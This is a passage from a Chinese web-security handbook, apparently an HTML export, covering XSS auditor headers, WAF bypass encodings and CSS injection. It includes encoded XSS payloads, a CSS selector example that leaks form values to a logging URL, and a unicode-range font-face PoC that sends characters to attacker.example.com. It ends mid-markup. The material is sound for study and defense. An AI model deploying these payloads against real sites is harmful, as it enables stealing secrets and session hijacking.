Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。</span></p><p><span>而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。</span></p><p><span>要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段该字段有三个可选的值</span></p></blockquote><ul><li><span>0 : 表示关闭浏览器的 XSS 防护机制</span></li><li><span>1 : 删除检测到的恶意代码，如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为</span></li></ul><blockquote><p><span>X-XSS-Protection 配置为 1，这是浏览器的默认设置</span></p></blockquote><ul><li><span>1; mode=block : 如果检测到恶意代码，在不渲染恶意代码</span></li></ul><blockquote><p><span>FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。</span></p></blockquote><h3 id='428--waf-bypass'><span>4.2.8  WAF Bypass</span></h3><ul><li><p><span>利用 </span><span>&lt;</span><span>&gt;</span><span> 标记</span></p></li><li><h5 id='利用-html-属性'><span>利用 html 属性</span></h5><ul><li><span>href</span></li><li><span>lowsrc</span></li><li><span>bgsound</span></li><li><span>background</span></li><li><span>value</span></li><li><span>action</span></li><li><span>dynsrc</span></li></ul></li><li><h5 id='关键字-2'><span>关键字</span></h5><ul><li><p><span>利用回车拆分</span></p></li><li><h5 id='字符串拼接-1'><span>字符串拼接</span></h5><ul><li><span>window</span><span>[</span><span>&quot;</span><span>al</span><span>&quot;</span><span> + </span><span>&quot;</span><span>ert</span><span>&quot;</span><span>]</span></li></ul></li></ul></li><li><h5 id='利用编码绕过'><span>利用编码绕过</span></h5><ul><li><p><span>base64</span></p></li><li><p><span>jsfuck</span></p></li><li><p><span>String.fromCharCode</span></p></li><li><p><span>HTML</span></p></li><li><p><span>URL</span></p></li><li><h5 id='hex'><span>hex</span></h5><ul><li><span>window</span><span>[</span><span>&quot;</span><span>\</span><span>x61</span><span>\</span><span>x6c</span><span>\</span><span>x65</span><span>\</span><span>x72</span><span>\</span><span>x74</span><span>&quot;</span><span>]</span></li></ul></li><li><p><span>unicode</span></p></li><li><h5 id='utf7'><span>utf7</span></h5><ul><li><span>+ADw-script+AD4-alert(</span><span>&#39;</span><span>XSS</span><span>&#39;</span><span>)+ADsAPA-/script+AD4-</span></li></ul></li><li><p><span>utf16</span></p></li></ul></li><li><p><span>大小写混淆</span></p></li><li><p><span>对标签属性值转码</span></p></li><li><p><span>产生事件</span></p></li><li><p><span>css 跨站解析</span></p></li><li><h5 id='长度限制-bypass'><span>长度限制 bypass</span></h5><ul><li><span>eval(name)</span></li><li><span>eval(hash)</span></li><li><span>import</span></li><li><span>$</span><span>.getScript</span></li><li><span>$</span><span>.get</span></li></ul></li><li><p><strong><span>.</span></strong></p><ul><li><span>使用 。绕过 IP/域名</span></li><li><span>document</span><span>[</span><span>&#39;</span><span>cookie</span><span>&#39;</span><span>]</span><span> 绕过属性取值</span></li></ul></li><li><p><span>过滤引号用 </span>‘’<span> </span>’<span> </span>‘’<span> 绕过</span></p></li></ul><h3 id='429--技巧'><span>4.2.9  技巧</span></h3><h4 id='httponly-2'><span>httponly</span></h4><ul><li><span>在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。</span></li><li><span>在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie</span></li><li><span>部分特定版本的浏览器可能会在 httponly 支持/处理上存在问题</span></li><li><span>低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段</span></li><li><span>phpinfo 等页面可能会回显信息，这些信息中包含 http 头</span></li><li><span>通过 xss 劫持页面钓鱼</span></li><li><span>通过 xss 伪造 oauth 等授权请求，远程登录</span></li></ul><h4 id='css-注入基本介绍'><span>CSS 注入基本介绍</span></h4><blockquote><p><span>CSS 注入最早开始于利用 CSS 中的 expression() url() regex() 等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。</span></p></blockquote><h4 id='css-selectors'><span>CSS selectors</span></h4><blockquote><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>9</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">style</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">#form2</span> <span class="cm-tag">input</span>[<span class="cm-tag">value</span>^=<span class="cm-string">'a'</span>] { <span class="cm-property">background-image</span>: <span class="cm-atom">url</span>(<span class="cm-string">http://localhost/log.php/a</span>); }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">#form2</span> <span class="cm-tag">input</span>[<span class="cm-tag">value</span>^=<span class="cm-string">'b'</span>] { <span class="cm-property">background-image</span>: <span class="cm-atom">url</span>(<span class="cm-string">http://localhost/log.php/b</span>); }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">#form2</span> <span class="cm-tag">input</span>[<span class="cm-tag">value</span>^=<span class="cm-string">'c'</span>] { <span class="cm-property">background-image</span>: <span class="cm-atom">url</span>(<span class="cm-string">http://localhost/log.php/c</span>); }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[...]</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">style</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">form</span> <span class="cm-attribute">action</span>=<span class="cm-string">"http://example.com"</span> <span class="cm-attribute">id</span>=<span class="cm-string">"form2"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">input</span> <span class="cm-attribute">type</span>=<span class="cm-string">"text"</span> <span class="cm-attribute">id</span>=<span class="cm-string">"secret"</span> <span class="cm-attribute">name</span>=<span class="cm-string">"secret"</span> <span class="cm-attribute">value</span>=<span class="cm-string">"abc"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">form</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>上图是利用 CSS selectors 完成攻击的一个示例</span></p></blockquote><h4 id='abusing-unicode-range'><span>Abusing Unicode Range</span></h4><blockquote><p><span>当可以插入 CSS 的时候，可以使用 font-face 配合 unicode-range 获取目标网页对应字符集。PoC 如下</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>21</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">style</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">@font-face</span>{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">font-family</span>:<span class="cm-variable">poc</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">src</span>: <span class="cm-atom">url</span>(<span class="cm-string">http://attacker.example.com/?A</span>); <span class="cm-comment">/* fetched */</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">unicode-range</span>:<span class="cm-variable">U</span>+<span class="cm-number">0041</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">@font-face</span>{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">font-family</span>:<span class="cm-variable">poc</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">src</span>: <span class="cm-atom">url</span>(<span class="cm-string">http://attacker.example.com/?B</span>); <span class="cm-comment">/* fetched too */</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">unicode-range</span>:<span class="cm-variable">U</span>+<span class="cm-number">0042</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">@font-face</span>{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">font-family</span>:<span class="cm-variable">poc</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">src</span>: <span class="cm-atom">url</span>(<span class="cm-string">http://attacker.example.com/?C</span>); <span class="cm-comment">/* not fetched */</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">unicode-range</span>:<span class="cm-variable">U</span>+<span class="cm-number">0043</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">#sensitive-information</span>{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-property">font-family</span>:<span class="cm-variable">poc</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">style</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">p</span> <span class="cm-attribute">id</span>=<span class="cm-string">"sensitive-information"</span><span class="cm-tag cm-bracket">&gt;</span>AB<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">p</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 476px;"></div><div class="CodeMirror-gutters" style="height: 476px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><p>&nbsp;</p></blockquote><blockquote><p><span>当字符较多时，则可以结合 ::first-line 等 CSS 属性缩小范围，以获取更精确的内容</span></p></blockquote><h4 id='bypass-via-script-gadgets'><span>Bypass Via Script Gadgets</span></h4><h5 id='简介-13'><span>简介</span></h5><blockquote><p><span>一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为 Code Reuse 的攻击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文 Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets 中有该方法的具体描述。</span></p><p><span>portswigger 的 一 篇 博 文 也 表 达 了 类 似 的 想 法 </span><a href='https://portswigger.net/blog/' target='_blank' class='url'>https://portswigger.net/blog/</a><span> abusing-javascript-frameworks-to-bypass-xss-mitigations。</span></p><p><span>下面有一个简单的例子，这个例子使用了 DOMPurify 来加固，但是因为引入了 jquery.mobile.js 导致可以被攻击。</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>6</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">// index.php</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&lt;?</span><span class="cm-variable">php</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$msg</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$_GET</span>[<span class="cm-string">'message'</span>];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$msg</span> <span class="cm-operator">=</span> <span class="cm-builtin">str_replace</span>(<span class="cm-string">"\n"</span>, <span class="cm-string">""</span>, <span class="cm-variable-2">$msg</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$msg</span> <span class="cm-operator">=</span> <span class="cm-builtin">base64_encode</span>(<span class="cm-variable-2">$msg</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">?&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 136px;"></div><div class="CodeMirror-gutters" style="height: 136px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>17</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;!DOCTYPE html&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">html</span> <span class="cm-attribute">lang</span>=<span class="cm-string">"en"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">head</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">meta</span> <span class="cm-attribute">charset</span>=<span class="cm-string">"UTF-8"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">title</span><span class="cm-tag cm-bracket">&gt;</span>Preview<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">title</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">script</span> <span class="cm-attribute">type</span>=<span class="cm-string">"text/javascript"</span> <span class="cm-attribute">src</span>=<span class="cm-string">"purify.js"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">script</span> <span class="cm-attribute">type</span>=<span class="cm-string">"text/javascript"</span> <span class="cm-attribute">src</span>=<span class="cm-string">"jquery.js"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">script</span> <span class="cm-attribute">type</span>=<span class="cm-string">"text/javascript"</span> <span class="cm-attribute">src</span>=<span class="cm-string">"jquery.mobile.js"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag 